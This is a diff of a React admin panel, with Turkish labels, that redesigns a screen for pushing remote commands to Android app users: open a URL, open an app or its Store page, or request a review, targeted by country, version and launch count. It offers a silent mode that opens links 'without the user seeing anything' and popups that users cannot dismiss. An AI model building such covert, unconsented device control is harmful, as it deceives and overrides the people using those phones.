@@ -574,6 +574,63 @@ const PANEL_CSS = `
   .pn-tabs button.on { background: #26232f; color: #fff; box-shadow: inset 0 0 0 1px rgba(139,92,246,0.45); }
   .pn-tabs button.on .pn-ico { color: #c4b5fd; }
   .pn-tabs .pn-ico { width: 16px !important; height: 16px !important; }
+  .da-grid { display: grid; grid-template-columns: minmax(0, 1.45fr) minmax(0, 1fr); gap: 18px; align-items: start; }
+  .da-step { background: #18181c; border: 1px solid rgba(255,255,255,0.07); border-radius: 14px; padding: 14px 16px; margin-bottom: 12px; }
+  .da-sh { display: flex; align-items: center; gap: 9px; font-size: 14px; font-weight: 650; color: #f4f4f6; margin-bottom: 12px; }
+  .da-sh b { width: 22px; height: 22px; border-radius: 50%; display: grid; place-items: center; font-size: 11.5px; background: rgba(139,92,246,0.18); color: #c4b5fd; }
+  .da-types { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 8px; }
+  .da-type { text-align: left; background: #141418; border: 1px solid rgba(255,255,255,0.08); border-radius: 11px; padding: 10px 11px; color: #9a9aa6; cursor: pointer; font: inherit; }
+  .da-type svg { width: 19px !important; height: 19px !important; color: #d4d4dc; display: block; margin-bottom: 6px; }
+  .da-type span { display: block; color: #f4f4f6; font-size: 13px; font-weight: 650; }
+  .da-type small { display: block; font-size: 11.5px; margin-top: 2px; line-height: 1.35; }
+  .da-type.on { border-color: #8b5cf6; background: rgba(139,92,246,0.1); box-shadow: 0 0 0 3px rgba(139,92,246,0.15); }
+  .da-type.on svg { color: #c4b5fd; }
+  .da-lbl { display: block; font-size: 12px; color: #9a9aa6; margin: 12px 0 5px; }
+  .da-two { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+  .da-seg { display: inline-flex; flex-wrap: wrap; gap: 2px; padding: 3px; border-radius: 10px; background: #141418; border: 1px solid rgba(255,255,255,0.08); }
+  .da-seg button { border: 0; background: none; color: #a1a1ab; font: inherit; font-size: 12.5px; font-weight: 600; padding: 6px 11px; border-radius: 7px; cursor: pointer; white-space: nowrap; }
+  .da-seg button:hover { color: #fff; }
+  .da-seg button.on { background: #2a2733; color: #fff; box-shadow: inset 0 0 0 1px rgba(139,92,246,0.5); }
+  .da-row { display: flex; align-items: center; justify-content: space-between; gap: 12px; padding: 7px 0; font-size: 13px; color: #a1a1ab; border-top: 1px solid rgba(255,255,255,0.05); flex-wrap: wrap; }
+  .da-step .da-row:first-of-type { border-top: 0; }
+  .da-hint { font-size: 11.5px; color: #6b6b76; text-align: right; }
+  .da-side { position: sticky; top: 150px; }
+  .da-phone { border: 1px solid rgba(255,255,255,0.12); border-radius: 30px; padding: 10px; background: #0d0d10; max-width: 300px; margin: 0 auto; }
+  .da-screen { position: relative; height: 340px; border-radius: 22px; background: #17171c; overflow: hidden; }
+  .da-app { display: flex; align-items: center; gap: 8px; padding: 14px; font-size: 12.5px; color: #9a9aa6; font-weight: 600; }
+  .da-dlg { position: absolute; left: 14px; right: 14px; top: 105px; background: #26262d; border-radius: 16px; padding: 16px; font-size: 13.5px; color: #f4f4f6; box-shadow: 0 18px 40px rgba(0,0,0,0.55); }
+  .da-muted { color: #7c7c87; font-style: italic; }
+  .da-btns { display: flex; justify-content: flex-end; gap: 18px; margin-top: 16px; font-size: 13px; }
+  .da-btns span { color: #a1a1ab; }
+  .da-btns b { color: #a78bfa; }
+  .da-direct { position: absolute; left: 18px; right: 18px; top: 110px; text-align: center; color: #a1a1ab; font-size: 12.5px; display: flex; flex-direction: column; align-items: center; gap: 8px; }
+  .da-direct svg { width: 26px !important; height: 26px !important; color: #c4b5fd; }
+  .da-direct code { max-width: 100%; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 11px; }
+  .da-chips { display: flex; flex-wrap: wrap; gap: 5px; margin: 14px 0 10px; }
+  .da-chips span { font-size: 11.5px; color: #c4c4cc; background: #1f1f24; border: 1px solid rgba(255,255,255,0.07); padding: 3px 9px; border-radius: 999px; }
+  .da-match { display: flex; align-items: center; gap: 12px; padding: 10px 12px; border-radius: 12px; background: rgba(139,92,246,0.08); border: 1px solid rgba(139,92,246,0.3); margin-bottom: 12px; font-size: 12.5px; color: #c4c4cc; }
+  .da-match b { font-size: 22px; color: #fff; font-variant-numeric: tabular-nums; white-space: nowrap; }
+  .da-match small { color: #7c7c87; font-size: 11px; }
+  .da-hist { border: 1px solid rgba(255,255,255,0.08); border-radius: 14px; overflow: hidden; }
+  .da-hr { border-top: 1px solid rgba(255,255,255,0.06); }
+  .da-hr:first-child { border-top: 0; }
+  .da-hr.act { background: rgba(14,165,233,0.05); }
+  .da-hr-main { display: flex; align-items: center; gap: 10px; padding: 10px 14px; cursor: pointer; font-size: 13px; }
+  .da-hr-main:hover { background: rgba(255,255,255,0.03); }
+  .da-pill { font-size: 11px; font-weight: 700; padding: 2px 9px; border-radius: 999px; background: #232329; color: #7c7c87; flex-shrink: 0; }
+  .da-pill.on { background: rgba(34,197,94,0.14); color: #4ade80; }
+  .da-hr-i { width: 16px !important; height: 16px !important; color: #9a9aa6; }
+  .da-hr-v { flex: 1; min-width: 0; color: #f4f4f6; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .da-tag { font-size: 11.5px; color: #a1a1ab; background: #1f1f24; padding: 2px 8px; border-radius: 999px; white-space: nowrap; flex-shrink: 0; }
+  .da-cnt { font-size: 12px; color: #4ade80; font-weight: 600; white-space: nowrap; }
+  .da-acts { display: inline-flex; gap: 6px; }
+  .da-b { border: 1px solid rgba(255,255,255,0.1); background: #18181c; color: #a1a1ab; font: inherit; font-size: 12px; font-weight: 600; padding: 4px 10px; border-radius: 8px; cursor: pointer; }
+  .da-b:hover { color: #f87171; border-color: rgba(248,113,113,0.4); }
+  .da-b.warn { color: #fbbf24; }
+  .da-det { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px 16px; padding: 4px 14px 14px 52px; font-size: 12.5px; color: #f4f4f6; }
+  .da-det small { display: block; color: #6b6b76; font-size: 11px; margin-bottom: 2px; }
+  @media (max-width: 900px) { .da-grid { grid-template-columns: minmax(0, 1fr); } .da-side { position: static; } }
+  @media (max-width: 560px) { .da-types { grid-template-columns: minmax(0, 1fr); } .da-tag { display: none; } .da-det { padding-left: 14px; } }
   .pn-scrim { display: none; }
   @media (max-width: 900px) {
     .pn-appbar { padding: 4px 16px 10px; }
@@ -659,6 +716,7 @@ function App() {
   const [daMinVersion, setDaMinVersion] = useState("");
   const [daMaxVersion, setDaMaxVersion] = useState("");
   const [daMinLaunches, setDaMinLaunches] = useState(0); // 0 = şart yok
+  const [daOpenId, setDaOpenId] = useState(null);   // geçmişte açık satır
   const [apiProviders, setApiProviders] = useState(null);
   const [apiHealth, setApiHealth] = useState([]);
   const [smartCache, setSmartCache] = useState({ enabled: true, minRequests: 3 });
@@ -1150,6 +1208,8 @@ function App() {
   useEffect(fetchApps, [API_URL]); // eslint-disable-line react-hooks/exhaustive-deps
   // Üst çubuktaki uygulama başına anlık sayılar
   const chipStats = useStatsSeries({ apiUrl: API_URL, appKey: APP_KEY, scope: "all", range: "live", byApp: !PANEL_LOCKED });
+  // Popup Gönder: hedefe uyan cihaz tahmini için seçili uygulamanın son verisi
+  const daStats = useStatsSeries({ apiUrl: API_URL, appKey: APP_KEY, scope: appId, range: "live", enabled: activeSection === "device" });
   const chipCount = (id) => {
     const a = chipStats.data && chipStats.data.byApp && chipStats.data.byApp.find(x => x.id === id);
     const pts = a ? a.series.filter(Boolean) : [];
@@ -1417,7 +1477,9 @@ function App() {
   const statsScopeLabel = statsScope === "all" ? "Tüm uygulamalar" : (currentApp.name || appId) + (appId === "default" ? " (kayıtsız paketler dahil)" : "");
   const allPts = chipStats.data ? chipStats.data.points.filter(x => !x.missing) : [];
   const allCount = allPts.length ? allPts[allPts.length - 1].t : null;
-  const appChips = Object.values(apps).sort((a, b) => (a.id === "default" ? -1 : b.id === "default" ? 1 : 0));
+  // En kalabalık uygulama solda; sayı yoksa sona, eşitlikte ada göre
+  const appChips = Object.values(apps).sort((a, b) =>
+    (chipCount(b.id) ?? -1) - (chipCount(a.id) ?? -1) || String(a.name || a.id).localeCompare(String(b.name || b.id), "tr"));
 
   return (
     <div className="pn-root">
@@ -4105,277 +4167,233 @@ function App() {
         </div>}
 
         {/* DEVICE ACTIONS */}
-        {activeSection === "device" && <div style={styles.card}>
-          <h2 style={styles.title}>📱 Popup Gönder</h2>
-          <p style={{ color: "#9a9aa6", fontSize: 13, marginBottom: 20 }}>
-            Android cihazlara uzaktan komut gönderin. Aktif action cihaz tarafından otomatik algılanır.
-          </p>
-
-          {/* Action Type */}
-          <div style={{ display: "flex", gap: 12, marginBottom: 16, flexWrap: "wrap" }}>
-            {[
-              { key: "chrome_url", label: "🌐 Chrome URL", desc: "Chrome'da URL aç" },
-              { key: "package_name", label: "📦 Package Name", desc: "Uygulama aç / Store'a yönlendir" },
-              { key: "review_sheet", label: "⭐ Review Sheet", desc: "Play Store değerlendirme" }
-            ].map(t => (
-              <button key={t.key} onClick={() => setDaActionType(t.key)}
-                style={{
-                  padding: "10px 18px", borderRadius: 8, border: daActionType === t.key ? "2px solid #0ea5e9" : "1px solid #2c2c33",
-                  background: daActionType === t.key ? "#0c2d48" : "#141418", color: "#fff", cursor: "pointer", fontSize: 13
-                }}>
-                {t.label}
-              </button>
-            ))}
-          </div>
-
-          {/* Mode Toggle */}
-          <div style={{ display: "flex", gap: 12, marginBottom: 16, alignItems: "center" }}>
-            <span style={{ color: "#aaa", fontSize: 13 }}>Mod:</span>
-            <button onClick={() => setDaMode("direct")}
-              style={{
-                padding: "8px 20px", borderRadius: 8, border: daMode === "direct" ? "2px solid #22c55e" : "1px solid #2c2c33",
-                background: daMode === "direct" ? "#14532d" : "#141418", color: "#fff", cursor: "pointer", fontSize: 13
-              }}>
-              ⚡ Direct (Sessiz)
-            </button>
-            <button onClick={() => setDaMode("popup")}
-              style={{
-                padding: "8px 20px", borderRadius: 8, border: daMode === "popup" ? "2px solid #f59e0b" : "1px solid #2c2c33",
-                background: daMode === "popup" ? "#451a03" : "#141418", color: "#fff", cursor: "pointer", fontSize: 13
-              }}>
-              💬 Popup (Onaylı)
-            </button>
-          </div>
-
-          {/* App Modu — hangi uygulama moduna gönderilecek (YouTube / Ringtone izole) */}
-          <div style={{ display: "flex", gap: 12, marginBottom: 16, alignItems: "center", flexWrap: "wrap" }}>
-            <span style={{ color: "#aaa", fontSize: 13 }}>Uygulama Modu:</span>
-            <button onClick={() => setDaAppMode("youtube")}
-              style={{
-                padding: "8px 20px", borderRadius: 8, border: daAppMode === "youtube" ? "2px solid #ef4444" : "1px solid #2c2c33",
-                background: daAppMode === "youtube" ? "#450a0a" : "#141418", color: "#fff", cursor: "pointer", fontSize: 13
-              }}>
-              ▶️ YouTube Modu
-            </button>
-            <button onClick={() => setDaAppMode("ringtone")}
-              style={{
-                padding: "8px 20px", borderRadius: 8, border: daAppMode === "ringtone" ? "2px solid #0ea5e9" : "1px solid #2c2c33",
-                background: daAppMode === "ringtone" ? "#0c2d48" : "#141418", color: "#fff", cursor: "pointer", fontSize: 13
-              }}>
-              🔔 Zil Sesi Modu
-            </button>
-            <button onClick={() => setDaAppMode("both")}
-              style={{
-                padding: "8px 20px", borderRadius: 8, border: daAppMode === "both" ? "2px solid #a855f7" : "1px solid #2c2c33",
-                background: daAppMode === "both" ? "#3b0764" : "#141418", color: "#fff", cursor: "pointer", fontSize: 13
-              }}>
-              🌐 Her İkisi
-            </button>
-          </div>
-
-          {/* Gösterim Sıklığı */}
-          <div style={{ display: "flex", gap: 12, marginBottom: 16, alignItems: "center" }}>
-            <span style={{ color: "#aaa", fontSize: 13 }}>Sıklık:</span>
-            <button onClick={() => setDaShowOnce(true)}
-              style={{
-                padding: "8px 20px", borderRadius: 8, border: daShowOnce ? "2px solid #a855f7" : "1px solid #2c2c33",
-                background: daShowOnce ? "#3b0764" : "#141418", color: "#fff", cursor: "pointer", fontSize: 13
-              }}>
-              1️⃣ Tek seferlik
-            </button>
-            <button onClick={() => setDaShowOnce(false)}
-              style={{
-                padding: "8px 20px", borderRadius: 8, border: !daShowOnce ? "2px solid #a855f7" : "1px solid #2c2c33",
-                background: !daShowOnce ? "#3b0764" : "#141418", color: "#fff", cursor: "pointer", fontSize: 13
-              }}>
-              🔁 Her açılışta
-            </button>
-            <span style={{ color: "#666", fontSize: 11 }}>
-              {daShowOnce ? "Cihaz başına 1 kez gösterilir" : "Her uygulama açılışında tekrar gösterilir"}
-            </span>
-          </div>
-
-          {/* Kullanım şartı — bu uygulamanın cihazdaki açılış sayısı (paket başına ayrı) */}
-          <div style={{ display: "flex", gap: 12, marginBottom: 16, alignItems: "center", flexWrap: "wrap" }}>
-            <span style={{ color: "#aaa", fontSize: 13 }}>Kullanım şartı:</span>
-            {[0, 3, 5, 10].map(n => (
-              <button key={n} onClick={() => setDaMinLaunches(n)}
-                style={{
-                  padding: "8px 16px", borderRadius: 8, border: Number(daMinLaunches) === n ? "2px solid #f59e0b" : "1px solid #2c2c33",
-                  background: Number(daMinLaunches) === n ? "#451a03" : "#141418", color: "#fff", cursor: "pointer", fontSize: 13
-                }}>
-                {n === 0 ? "Şart yok" : `${n}+ kullanım`}
-              </button>
-            ))}
-            <input type="number" min="0" max="1000" style={{ ...styles.input, width: 90 }} placeholder="Özel"
-              value={daMinLaunches || ""} onChange={e => setDaMinLaunches(Math.max(0, parseInt(e.target.value) || 0))} />
-            <span style={{ color: "#666", fontSize: 11 }}>
-              {Number(daMinLaunches) > 0
-                ? `Uygulamayı en az ${daMinLaunches} kez açmış kullanıcılara gösterilir`
-                : "Kaç kez açtığına bakılmaz"}
-            </span>
-          </div>
-
-          {/* Value Input */}
-          {daActionType !== "review_sheet" && (
-            <div style={{ marginBottom: 16 }}>
-              <label style={styles.label}>
-                {daActionType === "chrome_url" ? "URL (https://...)" : "Package Name (com.example.app)"}
-              </label>
-              <input style={{ ...styles.input, width: "100%", boxSizing: "border-box" }}
-                placeholder={daActionType === "chrome_url" ? "https://example.com" : "com.whatsapp"}
-                value={daValue} onChange={e => setDaValue(e.target.value)} />
+        {activeSection === "device" && (() => {
+          const typeOpts = [
+            { key: "chrome_url", icon: '<circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 0 1 0 18M12 3a14 14 0 0 0 0 18"/>', t: "Link aç", d: "Chrome'da URL açar" },
+            { key: "package_name", icon: '<path d="m12 3 8 4.5v9L12 21l-8-4.5v-9z"/><path d="m12 12 8-4.5M12 12v9M12 12 4 7.5"/>', t: "Uygulama aç", d: "Paket adıyla açar / Store'a gider" },
+            { key: "review_sheet", icon: '<path d="m12 3 2.7 5.6 6.1.9-4.4 4.3 1 6.1L12 17l-5.4 2.9 1-6.1L3.2 9.5l6.1-.9z"/>', t: "Puan iste", d: "Play değerlendirme penceresi" },
+          ];
+          const ico = (d, cls) => <svg className={cls} viewBox="0 0 24 24" dangerouslySetInnerHTML={{ __html: d }} />;
+          const seg = (opts, val, set) => (
+            <div className="da-seg">
+              {opts.map(([v, l]) => <button key={String(v)} type="button" className={val === v ? "on" : ""} onClick={() => set(v)}>{l}</button>)}
             </div>
-          )}
-
-          {/* Popup Label + buton yazıları + zorunlu (sadece popup modunda) */}
-          {daMode === "popup" && (
-            <>
-              <div style={{ marginBottom: 16 }}>
-                <label style={styles.label}>Popup Mesajı (opsiyonel)</label>
-                <input style={{ ...styles.input, width: "100%", boxSizing: "border-box" }}
-                  placeholder="Kullanıcıya gösterilecek mesaj..."
-                  value={daLabel} onChange={e => setDaLabel(e.target.value)} />
-              </div>
-
-              <div style={{ display: "flex", gap: 12, marginBottom: 16 }}>
-                <div style={{ flex: 1 }}>
-                  <label style={styles.label}>✅ Onay butonu yazısı</label>
-                  <input style={{ ...styles.input, width: "100%", boxSizing: "border-box" }}
-                    placeholder="Aç / Güncelle / Tamam…"
-                    value={daConfirmText} onChange={e => setDaConfirmText(e.target.value)} />
-                </div>
-                <div style={{ flex: 1 }}>
-                  <label style={styles.label}>✖️ İptal butonu yazısı</label>
-                  <input style={{ ...styles.input, width: "100%", boxSizing: "border-box", opacity: daForceAction ? 0.4 : 1 }}
-                    placeholder="İptal / Sonra…"
-                    disabled={daForceAction}
-                    value={daCancelText} onChange={e => setDaCancelText(e.target.value)} />
-                </div>
-              </div>
-
-              <label style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 16, color: daForceAction ? "#ef4444" : "#aaa", fontSize: 13, cursor: "pointer" }}>
-                <input type="checkbox" checked={daForceAction} onChange={e => setDaForceAction(e.target.checked)} />
-                🔒 İptal edilemez (zorunlu) — kullanıcı kapatamaz, mecbur onay butonuna basar
-              </label>
-            </>
-          )}
-
-          {/* Ülke hedefleme */}
-          <div style={{ marginBottom: 16 }}>
-            <label style={styles.label}>🌍 Ülke hedefleme</label>
-            <div style={{ display: "flex", gap: 8 }}>
-              <select style={{ ...styles.input, width: 140, alignSelf: "flex-start" }} value={daCountryMode} onChange={e => setDaCountryMode(e.target.value)}>
-                <option value="all">Tüm ülkeler</option>
-                <option value="include">Sadece şunlar</option>
-                <option value="exclude">Şunlar hariç</option>
-              </select>
-              <DaCountryPicker mode={daCountryMode} countries={daCountries} onChange={setDaCountries}
-                disabled={daCountryMode === "all"} />
-            </div>
-          </div>
-
-          {/* Sürüm hedefleme */}
-          <div style={{ marginBottom: 16 }}>
-            <label style={styles.label}>📱 Sürüm hedefleme (versionCode — 0 = sınırsız)</label>
-            <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
-              <input type="number" style={{ ...styles.input, width: 110 }} placeholder="Min"
-                value={daMinVersion} onChange={e => setDaMinVersion(e.target.value)} />
-              <span style={{ color: "#9a9aa6" }}>—</span>
-              <input type="number" style={{ ...styles.input, width: 110 }} placeholder="Max"
-                value={daMaxVersion} onChange={e => setDaMaxVersion(e.target.value)} />
-              <span style={{ color: "#6b6b76", fontSize: 12 }}>örn. eski sürüme göstermek için Max=99</span>
-            </div>
-          </div>
-
-          <button style={{ ...styles.primaryBtn }} onClick={createDeviceAction}>
-            🚀 Action Gönder
-          </button>
-
-          {/* Existing Actions List */}
-          {deviceActions.length > 0 && (
-            <div style={{ marginTop: 24 }}>
-              <h3 style={{ color: "#9a9aa6", fontSize: 14, marginBottom: 12 }}>Geçmiş Actions</h3>
-              {deviceActions.map(action => {
-                const am = action.appMode || "youtube";
-                const cList = Array.isArray(action.countries) ? action.countries : [];
-                const cMode = action.countryMode || "all";
-                const countryText = cMode === "all" || cList.length === 0
-                  ? "🌍 Tüm ülkeler"
-                  : (cMode === "exclude" ? "🚫 Hariç: " : "✅ Sadece: ") + cList.map(c => `${countryFlag(c)} ${countryName(c)}`).join(", ");
-                const verText = !action.minVersion && !action.maxVersion
-                  ? "Tüm sürümler"
-                  : `${action.minVersion || "—"} → ${action.maxVersion || "—"}`;
-                const created = action.createdAt
-                  ? new Date(action.createdAt).toLocaleString("tr-TR", { day: "2-digit", month: "long", year: "numeric", hour: "2-digit", minute: "2-digit" })
-                  : "—";
-                const typeText = action.actionType === "chrome_url" ? "🌐 Chrome URL"
-                  : action.actionType === "package_name" ? "📦 Package Name" : "⭐ Review Sheet";
-                const details = [
-                  ["Komut", typeText],
-                  ["Gönderim", action.mode === "direct" ? "⚡ Direct (Sessiz)" : "💬 Popup (Onaylı)"],
-                  ["Uygulama modu", am === "ringtone" ? "🔔 Zil Sesi Modu" : am === "both" ? "🌐 Her İkisi" : "▶️ YouTube Modu"],
-                  ["Sıklık", action.showOnce === false ? "🔁 Her açılışta" : "1️⃣ Tek seferlik"],
-                  ["Kullanım şartı", action.minLaunches > 0 ? `🔢 En az ${action.minLaunches} kullanım` : "Şart yok"],
-                  ["Sürüm (versionCode)", verText],
-                  ["Ülkeler", countryText],
-                ];
-                if (action.mode === "popup") {
-                  details.push(["Popup mesajı", action.label || "Varsayılan"]);
-                  details.push(["Butonlar", `✅ ${action.confirmText || "Varsayılan"}${action.forceAction ? "" : ` · ✖️ ${action.cancelText || "Varsayılan"}`}`]);
-                  details.push(["Zorunlu", action.forceAction ? "🔒 Evet, kapatılamaz" : "Hayır"]);
-                }
-                return (
-                <div key={action.id} style={{
-                  background: action.active ? "#0c2d48" : "#18181c", padding: "14px 16px",
-                  borderRadius: 8, marginBottom: 10, border: action.active ? "1px solid #0ea5e9" : "1px solid #2c2c33"
-                }}>
-                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 12, flexWrap: "wrap" }}>
-                    <div style={{ minWidth: 0 }}>
-                      <span style={{ color: action.active ? "#0ea5e9" : "#666", fontSize: 12, marginRight: 8 }}>
-                        {action.active ? "● AKTİF" : "○ Pasif"}
-                      </span>
-                      <span style={{
-                        fontSize: 11, fontWeight: 700, marginRight: 8, padding: "2px 8px", borderRadius: 6,
-                        background: am === "ringtone" ? "#0c2d48" : (am === "both" ? "#3b0764" : "#450a0a"),
-                        color: am === "ringtone" ? "#0ea5e9" : (am === "both" ? "#c084fc" : "#f87171")
-                      }}>
-                        {am === "ringtone" ? "🔔 RINGTONE" : (am === "both" ? "🌐 HER İKİSİ" : "▶️ YOUTUBE")}
-                      </span>
-                      <span style={{ color: "#fff", fontSize: 13, wordBreak: "break-all" }}>
-                        {action.actionType === "chrome_url" && "🌐 "}
-                        {action.actionType === "package_name" && "📦 "}
-                        {action.actionType === "review_sheet" && "⭐ "}
-                        {action.value}
-                      </span>
-                    </div>
-                    <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
-                      <span style={{ color: "#4ade80", fontSize: 12, fontWeight: 600 }}>{action.executedCount || 0} kez gönderildi</span>
-                      {action.active && (
-                        <button onClick={() => deactivateDeviceAction(action.id)}
-                          style={{ ...styles.textBtn, color: "#f59e0b", fontSize: 12 }}>Durdur</button>
-                      )}
-                      <button onClick={() => deleteDeviceAction(action.id)}
-                        style={{ ...styles.textBtn, fontSize: 12 }}>Sil</button>
-                    </div>
-                  </div>
-                  <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(220px, 1fr))", gap: "8px 16px", marginTop: 12, paddingTop: 12, borderTop: "1px solid #2c2c33" }}>
-                    {details.map(([k, v]) => (
-                      <div key={k} style={{ fontSize: 12, gridColumn: k === "Ülkeler" ? "1 / -1" : undefined }}>
-                        <div style={{ color: "#6b6b76", marginBottom: 2 }}>{k}</div>
-                        <div style={{ color: "#f4f4f6" }}>{v}</div>
-                      </div>
+          );
+          const amLabel = (am) => am === "ringtone" ? "Zil sesi" : am === "both" ? "İkisi" : "Müzik";
+          const ccSummary = daCountryMode === "all" || !daCountries.length ? "Tüm ülkeler"
+            : (daCountryMode === "exclude" ? "Hariç: " : "Sadece: ") + daCountries.slice(0, 4).join(", ") + (daCountries.length > 4 ? ` +${daCountries.length - 4}` : "");
+          const verSummary = !daMinVersion && !daMaxVersion ? "Tüm sürümler" : `Sürüm ${daMinVersion || "—"} → ${daMaxVersion || "—"}`;
+          // Hedefe uyan cihaz tahmini: seçili uygulamanın son 5 dk verisi (sürüm/kullanım şartı hesaba katılmaz)
+          const pts = daStats.data ? daStats.data.points.filter(p => !p.missing) : [];
+          const lp = pts[pts.length - 1];
+          let match = null;
+          if (lp) {
+            const cc = lp.c || {};
+            const ccSum = (list) => list.reduce((a, k) => a + (cc[k] || 0), 0);
+            const base = daCountryMode === "include" && daCountries.length ? ccSum(daCountries)
+              : daCountryMode === "exclude" && daCountries.length ? Math.max(0, lp.t - ccSum(daCountries)) : lp.t;
+            const share = lp.t > 0 ? (daAppMode === "ringtone" ? lp.r / lp.t : daAppMode === "youtube" ? lp.y / lp.t : 1) : 0;
+            match = Math.round(base * share);
+          }
+          const directText = daActionType === "chrome_url" ? "Kullanıcı hiçbir şey görmeden link açılır"
+            : daActionType === "package_name" ? "Kullanıcı hiçbir şey görmeden uygulama / Store açılır" : "Play değerlendirme penceresi açılır";
+          return (
+          <div style={styles.card}>
+            <h2 style={styles.title}>📱 Popup Gönder</h2>
+            <p style={{ color: "#9a9aa6", fontSize: 13, margin: "-6px 0 18px" }}>
+              Android cihazlara uzaktan komut gönderin. Aktif action cihaz tarafından otomatik algılanır.
+            </p>
+            <div className="da-grid">
+              <div>
+                <div className="da-step">
+                  <div className="da-sh"><b>1</b>Ne yapsın</div>
+                  <div className="da-types">
+                    {typeOpts.map(t => (
+                      <button key={t.key} type="button" className={"da-type" + (daActionType === t.key ? " on" : "")} onClick={() => setDaActionType(t.key)}>
+                        {ico(t.icon)}<span>{t.t}</span><small>{t.d}</small>
+                      </button>
                     ))}
                   </div>
-                  <div style={{ color: "#475569", fontSize: 11, marginTop: 10, fontFamily: "monospace" }}>
-                    📅 {created} · ID: {action.id}
+                  {daActionType !== "review_sheet" && (
+                    <>
+                      <label className="da-lbl">{daActionType === "chrome_url" ? "Adres (https://…)" : "Paket adı"}</label>
+                      <input style={{ ...styles.input, width: "100%", boxSizing: "border-box" }}
+                        placeholder={daActionType === "chrome_url" ? "https://example.com" : "com.whatsapp"}
+                        value={daValue} onChange={e => setDaValue(e.target.value)} />
+                    </>
+                  )}
+                </div>
+
+                <div className="da-step">
+                  <div className="da-sh"><b>2</b>Nasıl gösterilsin</div>
+                  {seg([["direct", "Sessiz (direkt)"], ["popup", "Onaylı popup"]], daMode, setDaMode)}
+                  {daMode === "popup" && (
+                    <>
+                      <label className="da-lbl">Mesaj (opsiyonel)</label>
+                      <input style={{ ...styles.input, width: "100%", boxSizing: "border-box" }}
+                        placeholder="Kullanıcıya gösterilecek mesaj..." value={daLabel} onChange={e => setDaLabel(e.target.value)} />
+                      <div className="da-two">
+                        <div>
+                          <label className="da-lbl">Onay butonu</label>
+                          <input style={{ ...styles.input, width: "100%", boxSizing: "border-box" }} placeholder="Aç / Güncelle / Tamam…"
+                            value={daConfirmText} onChange={e => setDaConfirmText(e.target.value)} />
+                        </div>
+                        <div>
+                          <label className="da-lbl">İptal butonu</label>
+                          <input style={{ ...styles.input, width: "100%", boxSizing: "border-box", opacity: daForceAction ? 0.4 : 1 }} placeholder="İptal / Sonra…"
+                            disabled={daForceAction} value={daCancelText} onChange={e => setDaCancelText(e.target.value)} />
+                        </div>
+                      </div>
+                      <label className="da-row" style={{ cursor: "pointer", color: daForceAction ? "#f87171" : undefined }}>
+                        <span>🔒 Zorunlu — kullanıcı kapatamaz, onaya basmak zorunda</span>
+                        <input type="checkbox" checked={daForceAction} onChange={e => setDaForceAction(e.target.checked)} />
+                      </label>
+                    </>
+                  )}
+                </div>
+
+                <div className="da-step">
+                  <div className="da-sh"><b>3</b>Kime</div>
+                  <div className="da-row"><span>Uygulama modu</span>{seg([["youtube", "Müzik"], ["ringtone", "Zil sesi"], ["both", "İkisi"]], daAppMode, setDaAppMode)}</div>
+                  <div className="da-row"><span>Sıklık</span>{seg([[true, "Bir kez"], [false, "Her açılışta"]], daShowOnce, setDaShowOnce)}</div>
+                  <div className="da-row">
+                    <span>En az kullanım</span>
+                    <div style={{ display: "flex", gap: 6, alignItems: "center", flexWrap: "wrap", justifyContent: "flex-end" }}>
+                      {seg([[0, "Yok"], [3, "3+"], [5, "5+"], [10, "10+"]], Number(daMinLaunches), setDaMinLaunches)}
+                      <input type="number" min="0" max="1000" style={{ ...styles.input, width: 72, padding: "6px 8px" }} placeholder="Özel"
+                        value={daMinLaunches || ""} onChange={e => setDaMinLaunches(Math.max(0, parseInt(e.target.value) || 0))} />
+                    </div>
+                  </div>
+                  <div className="da-row" style={{ alignItems: "flex-start" }}>
+                    <span style={{ paddingTop: 8 }}>Ülkeler</span>
+                    <div style={{ display: "flex", gap: 8, flex: 1, minWidth: 0, justifyContent: "flex-end", maxWidth: 420 }}>
+                      <select style={{ ...styles.input, width: 130, alignSelf: "flex-start" }} value={daCountryMode} onChange={e => setDaCountryMode(e.target.value)}>
+                        <option value="all">Tüm ülkeler</option>
+                        <option value="include">Sadece şunlar</option>
+                        <option value="exclude">Şunlar hariç</option>
+                      </select>
+                      <div style={{ flex: 1, minWidth: 0 }}>
+                        <DaCountryPicker mode={daCountryMode} countries={daCountries} onChange={setDaCountries} disabled={daCountryMode === "all"} />
+                      </div>
+                    </div>
+                  </div>
+                  <div className="da-row">
+                    <span>Sürüm (versionCode)</span>
+                    <div style={{ display: "flex", gap: 6, alignItems: "center" }}>
+                      <input type="number" style={{ ...styles.input, width: 80, padding: "6px 8px" }} placeholder="min" value={daMinVersion} onChange={e => setDaMinVersion(e.target.value)} />
+                      <span style={{ color: "#6b6b76" }}>—</span>
+                      <input type="number" style={{ ...styles.input, width: 80, padding: "6px 8px" }} placeholder="max" value={daMaxVersion} onChange={e => setDaMaxVersion(e.target.value)} />
+                    </div>
+                  </div>
+                  <div className="da-hint">0 / boş = sınırsız · eski sürüme göstermek için max=99</div>
+                </div>
+              </div>
+
+              {/* Önizleme + özet + gönder */}
+              <div className="da-side">
+                <div className="da-phone">
+                  <div className="da-screen">
+                    <div className="da-app"><span className="pn-av" style={{ background: brand, width: 22, height: 22, fontSize: 11, borderRadius: 6 }}>{String(currentApp.name || appId).trim().charAt(0).toLocaleUpperCase("tr")}</span>{currentApp.name || appId}</div>
+                    {daMode === "popup" ? (
+                      <div className="da-dlg">
+                        <div className={daLabel ? "" : "da-muted"}>{daLabel || "Varsayılan mesaj"}</div>
+                        <div className="da-btns">
+                          {!daForceAction && <span>{daCancelText || "İptal"}</span>}
+                          <b>{daConfirmText || "Tamam"}</b>
+                        </div>
+                      </div>
+                    ) : (
+                      <div className="da-direct">
+                        {ico(daActionType === "review_sheet" ? typeOpts[2].icon : '<path d="M14 4h6v6M20 4l-9 9M18 14v5a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1h5"/>')}
